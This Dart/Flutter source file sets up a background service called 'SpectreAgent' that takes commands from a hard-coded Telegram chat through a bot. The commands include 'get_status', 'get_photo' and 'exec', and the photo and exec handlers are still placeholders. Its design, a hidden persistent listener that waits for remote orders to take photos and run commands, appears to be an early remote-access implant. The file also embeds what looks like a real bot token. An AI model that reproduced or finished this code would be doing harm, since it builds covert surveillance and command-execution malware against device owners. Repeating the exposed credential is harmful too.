import 'dart:async';
import 'dart:ui';
import 'package:flutter/services.dart';
import 'package:flutter/widgets.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:telebot/telebot.dart';
import 'package.dart';

// TODO: REPLACE THESE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID
const String BOT_TOKEN = '7563152344:AAE2PvLBIGDbu-_s13XhWQTtAthQyquofNc';
const int CHAT_ID = -1002941249156; // Get this from a bot like @userinfobot

// This is the entry point for the background service.
@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  // This is required for the background service to work.
  DartPluginRegistrant.ensureInitialized();

  final bot = TeleBot(BOT_TOKEN);

  // This is the main listener. It fires every time a new message comes in.
  bot.onMessage().listen((message) async {
    // We only give a fuck about messages from our specific chat.
    if (message.chat.id != CHAT_ID) return;

    final text = message.text?.toLowerCase() ?? '';
    final parts = text.split(' ');
    final command = parts[0];

    print("Received command: $command"); // Good for debugging

    try {
      switch (command) {
        case 'get_status':
          // A simple test command to make sure everything's working.
          await bot.sendMessage(CHAT_ID, 'SpectreAgent is online. Status: OK.');
          break;
        
        // We'll build these out later. For now, they just acknowledge the command.
        case 'get_photo':
          await bot.sendMessage(CHAT_ID, 'get_photo command received. Not implemented yet.');
          break;
        case 'exec':
          await bot.sendMessage(CHAT_ID, 'exec command received. Not implemented yet.');
          break;

        default:
          await bot.sendMessage(CHAT_ID, 'Unknown command: $command');
      }
    } catch (e) {
      // If something breaks, we'll know about it.
      await bot.sendMessage(CHAT_ID, 'FUCK. Error executing command: $e');
    }
  });

  // Start polling for updates from Telegram.
  bot.start();
  // Let the main app know the service is running.
  service.invoke('update', {'message': 'SpectreAgent is listening...'});
}
